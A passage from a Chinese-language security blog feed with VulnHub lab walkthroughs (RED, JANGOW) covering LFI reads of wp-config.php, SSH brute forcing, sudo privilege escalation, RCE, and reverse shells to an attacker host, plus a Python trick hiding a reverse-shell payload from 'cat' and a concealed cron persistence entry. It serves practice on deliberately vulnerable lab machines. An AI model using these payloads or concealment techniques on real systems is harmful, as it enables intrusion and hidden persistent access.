/var/.hack</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-329.png\" width=\"480\" alt=\"Image\">\n<p>检验是否权限维持成功<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-330.png\" width=\"350\" alt=\"Image\"></p>\n<h3 id=\"chattr-锁定文件权限\"><a class=\"markdownIt-Anchor\" href=\"#chattr-锁定文件权限\">#</a> chattr 锁定文件权限</h3>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">锁定文件</span> </span><br><span class=\"line\">chattr +i evil.php </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">属性查看</span></span><br><span class=\"line\">lsattr evil.php</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解除锁定</span></span><br><span class=\"line\">chattr -i evil.php </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">删除文件</span></span><br><span class=\"line\">rm -rf 1.evil.php</span><br></pre></td></tr></table></figure>\n<p>chattr 锁定权限，通过解锁才能删除</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/110%20RED/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/110%20RED/",
            "title": "VULNHUB 10 RED",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVkLTEsNzUzLw==\">https://www.vulnhub.com/entry/red-1,753/</span><br>\n 教程链接地址 1：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIxLzExLzAyL2hhY2tpbmctbGFiLXJlZC8=\">https://readysetexploit.wordpress.com/2021/11/02/hacking-lab-red/</span><br>\n 教程链接地址 2：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lvdXRoQmVsaWVmL2FydGljbGUvZGV0YWlscy8xMjI0NTg3MDU=\">https://blog.csdn.net/YouthBelief/article/details/122458705</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 RED：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-193.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.14</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.14 -oN /tmp/red.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-194.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 80</p>\n<h3 id=\"修改本地-hosts\"><a class=\"markdownIt-Anchor\" href=\"#修改本地-hosts\">#</a> 修改本地 hosts</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQ=\">http://192.168.31.14</span> 进行信息收集<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-195.png\" alt></p>\n<p>点击 “Hello Blue” 发现一个跳转界面，无法打开<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-196.png\" width=\"520\" alt=\"Image\"></p>\n<p>修改本地 hosts 文件 /etc/hosts, 改变 DNS 解析记录<br>\n 192.168.31.14 redrocks.win<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-197.png\" width=\"340\" alt=\"Image\"></p>\n<p>重新打开 url 地址，发现这里说网站已被攻击，并且有后门文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzd2luLzIwMjEvMTAvMjQvaGVsbG8td29ybGQv\"> http://redrocks.win/2021/10/24/hello-world/</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-198.png\" alt></p>\n<p>审查源代码，找到 Mr.Miessler 这个提示<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-199.png\" alt></p>\n<p>通过搜索，找到了这个人是 SecLists 的开发者<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-200.png\" width=\"580\" alt=\"Image\"></p>\n<h3 id=\"seclists-字典\"><a class=\"markdownIt-Anchor\" href=\"#seclists-字典\">#</a> seclists 字典</h3>\n<p>Seclists 是一个全面的字典，包括用户名、密码、URL、敏感数据模式、模糊测试负载、Web Shell 等等，在 kali 中 apt - y install seclists 安装，我们现在要想办法扫出来已被攻击服务器上的后门文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用gobuster加载seclists中的通用后门字典进行扫描。</span></span><br><span class=\"line\">gobuster dir -u http://redrocks.win/ -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x php,txt,html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-201.png\" alt></p>\n<p>找到一个后门文件 NetworkFileManagerPHP.php<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-202.png\" width=\"520\" alt=\"Image\"></p>\n<p>这应该就是后门文件了，但是我们没有参数值，需要爆破</p>\n<h3 id=\"wfuzz-爆破参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-爆破参数\">#</a> wfuzz 爆破参数</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用wfuzz加载seclists中的爆破参数名字的字典进行爆破</span></span><br><span class=\"line\">wfuzz -c -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-203.png\" width=\"520\" alt=\"Image\">\n<p>得到的结果是 key 的返回值是 200<br>\n-&gt; 可以构造 <span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT14eHg=\">http://redrocks.win/NetworkFileManagerPHP.php?key=xxx</span> 访问</p>\n<h3 id=\"lfi-文件包含漏洞\"><a class=\"markdownIt-Anchor\" href=\"#lfi-文件包含漏洞\">#</a> lfi 文件包含漏洞</h3>\n<p>尝试使用文件包含协议进行访问敏感文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT0vZXRjL3Bhc3N3ZA==\">http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-204.png\" alt></p>\n<p>尝试获取 NetworkFileManagerPHP.php 的源码<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwP2tleT1OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhw\"> http://redrocks.win/NetworkFileManagerPHP.php?key=NetworkFileManagerPHP.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-205.png\" alt></p>\n<p>发现内容显示不了，我们需要配合其他协议</p>\n<p>尝试用 php://filter/read=convert.base6 4 - encode/resource=xxx.php<br>\n 的 filter 协议去读取一些敏感文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5\"> http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key</span><br>\n=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-206.png\" alt></p>\n<p>对字符串进行 base64 解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-207.png\" alt></p>\n<p>继续读取文件，发现暗藏了一个 base64 密文，再次解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-208.png\" alt></p>\n<p>这里说是 “这个密码并不能帮助您！Hashcat 说规则就是规则”</p>\n<p>由于网站是 wordpress 搭建的，我们可以去访问数据库信息获取一些配置文<br>\n件，我们通过文件包含漏洞访问 wp-config.php 查看配置文件信息<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3JlZHJvY2tzLndpbi9OZXR3b3JrRmlsZU1hbmFnZXJQSFAucGhwL05ldHdvcmtGaWxlTWFuYWdlclBIUC5waHA/a2V5PXBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT13cC1jb25maWcucGhw\"> http://redrocks.win/NetworkFileManagerPHP.php/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-209.png\" alt></p>\n<p>通过 echo “xx” | base64 - d 的方式解密，得到数据库配置信息<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-210.png\" width=\"520\" alt=\"Image\"></p>\n<p>-&gt; 用户名：john 密码：R3v_m4lwh3r3_k1nG!!</p>\n<h3 id=\"hashcut-使用\"><a class=\"markdownIt-Anchor\" href=\"#hashcut-使用\">#</a> hashcut 使用</h3>\n<p>hashcat 生成密码对应的字典，hydra 连接 ssh<br>\nhashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule &gt; pass2.txt<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-211.png\" width=\"550\" alt=\"Image\"></p>\n<p>用 hydra 选择用户 john，密码为 hashcat 生成的字典进行连接 ssh<br>\nhydra -l john -P pass2.txt ssh://192.168.31.14 -f -t 4 -vV -o hydra.ssh<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-212.png\" width=\"580\" alt=\"Image\"></p>\n<p>-&gt; 用户名：join 密码：R3v_m4lwh3r3_k1nG!!21</p>\n<h3 id=\"sudotime提权\"><a class=\"markdownIt-Anchor\" href=\"#sudotime提权\">#</a> sudo (time) 提权</h3>\n<p>尝试登陆服务器的时候，发现密码是错误的<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-213.png\" width=\"480\" alt=\"Image\"></p>\n<p>再次用 hydra 破解 ssh 爆破，果然得到了不一样的密码，可能密码会定时修改<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-214.png\" width=\"580\" alt=\"Image\"></p>\n<p>登陆服务器，sudo -l 发现有 time 可提权<br>\n在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span> 上找到提权命令，进行权限升级<br>\n <code>sudo -u ippsec /usr/bin/time /bin/bash</code> <br>\n<img data-src=\"/N1h1l157/VULNHUB/image-215.png\" width=\"430\" alt=\"Image\"></p>\n<p>此会话窗口不稳定，间断性的被中断，而且密码每隔一段时间都会被修改，因此我们需要反弹出来一个稳定的 shell<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-216.png\" width=\"520\" alt=\"Image\"></p>\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</code> <br>\n 通过此命令反弹出来的 shell 仍然会被中断</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">选择加载到/dev/shm/中来反弹shell,命令<span class=\"built_in\">cat</span>被改写用<span class=\"built_in\">echo</span>替代</span></span><br><span class=\"line\">echo &#x27;#!/bin/bash&#x27; &gt; /dev/shm/shell.sh</span><br><span class=\"line\">echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1&#x27; &gt;&gt; /dev/shm/shell.sh</span><br><span class=\"line\">chmod +x /dev/shm/shell.sh</span><br><span class=\"line\">/dev/shm/shell.sh</span><br><span class=\"line\"></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-217.png\" width=\"520\" alt=\"Image\">\n<p>当原来的终端再次被强制退出的时候，我们的新终端貌似也出了一些意外<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-218.png\" alt></p>\n<p>我们只需要再次输入 python3 -c ‘import pty;pty.spawn (&quot;/bin/bash&quot;)’, 即可获得一个标准化的终端<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-219.png\" width=\"520\" alt=\"Image\"></p>\n<h3 id=\"pspy64s-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64s-监控\">#</a> pspy64s 监控</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">寻找一些ippsec可以访问的东西</span></span><br><span class=\"line\">find / -group ippsec -type d 2&gt;/dev/null | grep -v proc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-220.png\" width=\"520\" alt=\"Image\">\n<p>发现我们可以访问位于 wordpress 目录中的 .git 目录<br>\n我们的终端一直在弹出消息，而且这个消息是在 ippsec 上执行的</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">现在我们可以运行pspy64s检查 Red 是否正在执行我们在/var/www/wordpress/.git 目录中找到的文件</span></span><br><span class=\"line\">wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip</span><br><span class=\"line\">python -m http.server 80</span><br><span class=\"line\">wget 192.168.31.135/pspy64s</span><br><span class=\"line\">./pspy64s</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-221.png\" width=\"520\" alt=\"Image\">\n<p>看到 /usr/bin/gcc/var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev 被执行<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-222.png\" alt></p>\n<p>现在我们已经很明确了，supersecretfileuc.c 这个文件会被执行<br>\n而且是调用 root 权限去执行的这个文件，需要一个 c 的反弹 shell 的代码</p>\n<h3 id=\"各种语言反弹\"><a class=\"markdownIt-Anchor\" href=\"#各种语言反弹\">#</a> 各种语言反弹</h3>\n<p>各种语言反弹 shell 的代码：<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL1JldmVyc2UlMjBTaGVsbCUyMENoZWF0c2hlZXQubWQjYw==\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#c</span></p>\n<p>重新编辑 supersecretfileuc.c 这个文件<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-223.png\" width=\"500\" alt=\"Image\"></p>\n<p>并在 4444 端口出监听<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-224.png\" width=\"520\" alt=\"Image\"></p>\n<p>-&gt; 至此拿到了 root 权限，提权成功</p>\n<h3 id=\"cat配合cron维权\"><a class=\"markdownIt-Anchor\" href=\"#cat配合cron维权\">#</a> cat 配合 cron 维权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">编写python程序显示如下内容：</span><br><span class=\"line\">evil = &quot;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&quot;</span><br><span class=\"line\">normal = &quot;echo &#x27;Hello world!&#x27;&quot;</span><br><span class=\"line\">with open(&quot;/root/.test.sh&quot;, &quot;w&quot;) as f:</span><br><span class=\"line\">\toutput = &quot;#!/bin/bash\\n&quot;</span><br><span class=\"line\">\toutput += normal + &quot;;&quot; + evil + &quot; #\\r&quot; + normal + &quot; &quot; * (len(evil) + 3) + &quot;\\n&quot;</span><br><span class=\"line\">\tf.write(output)</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-225.png\" width=\"570\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 80</span><br><span class=\"line\">wget 192.168.31.135/1.py</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-226.png\" width=\"570\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">用py执行此文件后，会生成 /root/.test.sh</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">使用<span class=\"built_in\">cat</span>看的时候看不到 payload，但使用more 或者 <span class=\"built_in\">cat</span> -A 就会暴露</span></span><br><span class=\"line\"></span><br><span class=\"line\">rm -f 1.py &amp;&amp; chmod +x /root/.test.sh</span><br><span class=\"line\">mv /root/test.sh /root/.test.sh &amp;&amp; /root/.test.sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-227.png\" width=\"500\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">成功反弹出去，实现了cat隐藏木马,将此文件加入到计划文件中：</span><br><span class=\"line\">(crontab - l;printf &quot;*/1 * * * * /root/.test.sh;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-228.png\" alt></p>\n<p>-&gt; cron 中同样是被隐藏的计划任务，只要我们 nc -lvvp 4449 等待上线即可</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/118%20JANGOW/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/118%20JANGOW/",
            "title": "VULNHUB 18 JANGOW",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamFuZ293LTEwMSw3NTQv\">https://www.vulnhub.com/entry/jangow-101,754/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1a3VkZXNodW8vYXJ0aWNsZS9kZXRhaWxzLzEyMjk3NzkxNw==\">https://blog.csdn.net/kukudeshuo/article/details/122977917</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 JANGOW：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-388.png\" width=\"520\" alt=\"Image\">\n<p>不同的设备会表现出不同的 MAC 地址，这里没有显示出两个相同的 MAC 地址，不好判断哪个才是真正的靶机地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">确认承载靶机的win机器的MAC地址</span></span><br><span class=\"line\">ipconfig /all | find “物理地址”</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-389.png\" width=\"520\" alt=\"Image\">\n<p>通过比较上述两个图可以发现 A0-D3-7A-07-9E-8C 是 win 机器的 MAC 地址，而位于 win 机器上的靶机应该跟 win 主机享有同样的 MAC 地址，因此可以确定目标靶机的 ip 地址为 27</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.27</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-390.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21, 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjc=\">http://192.168.31.27</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-391.png\" width=\"340\" alt=\"Image\">\n<p>先对目标网站进行目录扫描</p>\n<p><code>dirsearch -u http://192.168.31.27/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-392.png\" width=\"420\" alt=\"Image\">\n<p><code>gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.27/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-393.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 只出现了一个目录 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZQ==\">http://192.168.31.27/site</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-394.png\" width=\"520\" alt=\"Image\">\n<p>对这个网站可以点击的地方进行了检查，发现存在下面这个 url 地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj0=\">http://192.168.31.27/site/busque.php?buscar=</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-395.png\" width=\"520\" alt=\"Image\">\n<p>疑似是一个后门文件，尝试进行 rce 注入</p>\n<h3 id=\"rce漏洞反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#rce漏洞反弹shell\">#</a> RCE 漏洞反弹 shell</h3>\n<img data-src=\"/N1h1l157/VULNHUB/image-396.png\" width=\"440\" alt=\"Image\">\n<p>RCE 漏洞存在，接下来通过这个地方进行反弹 shell，先判断目标服务器是否存在下列可以用来反弹 shell 的命令，可以用 curl bash php 来反弹 shell</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13aGljaCUyMGN1cmw7d2hpY2glMjBiYXNoO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwcGhwOw==\">http://192.168.31.27/site/busque.php?buscar=which curl;which bash;which python;which php;</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-397.png\" width=\"550\" alt=\"Image\">\n<p>用 wget 来下马，并查看是否将文件下载到了目标服务器上<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g7bHM=\"> http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.sh;ls</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-398.png\" width=\"650\" alt=\"Image\">\n<p>发现并没有文件被上传上去</p>\n<h3 id=\"rce漏洞绕过方式\"><a class=\"markdownIt-Anchor\" href=\"#rce漏洞绕过方式\">#</a> RCE 漏洞绕过方式</h3>\n<p>思考是否是因为 sh 脚本的原因，换成 php 文件尝试下载</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwucGhwO2xz\">http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.php;ls</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-399.png\" width=\"620\" alt=\"Image\">\n<p>发现 php 文件也无法被上传上去</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接通过bash反弹shell 的命令在url地址上执行</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1iYXNoJTIwLWMlMjAlMjdiYXNoJTIwLWklMjAlM0UmYW1wOyUyMC9kZXYvdGNwLzE5Mi4xNjguMzEuMTM1LzQ0NDQlMjAwJTNFJmFtcDsxJTI3\">http://192.168.31.27/site/busque.php?buscar=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1'</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-400.png\">\n<p>直接通过 bash 反弹也是失败的，尝试通过 php 的代码来反弹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.31.135&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;http://192.168.31.27/site/busque.php?buscar=php%20-r%20%27$sock=fsockopen(%22192.168.31.135%22,4444);exec(%22/bin/sh%20-i%20%3C&amp;3%20%3E&amp;3%202%3E&amp;3%22);%27</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-401.png\">\n<p>php 反弹 shell 也被服务器拒绝，下面通过 echo 来给服务器上写文件，看是否能写上文件  <code>echo “1” &gt; 1.php;ls</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTIyMSUyMiUzRTEucGhwO2xz\">http://192.168.31.27/site/busque.php?buscar=echo &quot;1&quot;&gt;1.php;ls</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-402.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 可以写文件，那么就尝试可以写后门</p>\n<h3 id=\"echo-后门至服务器\"><a class=\"markdownIt-Anchor\" 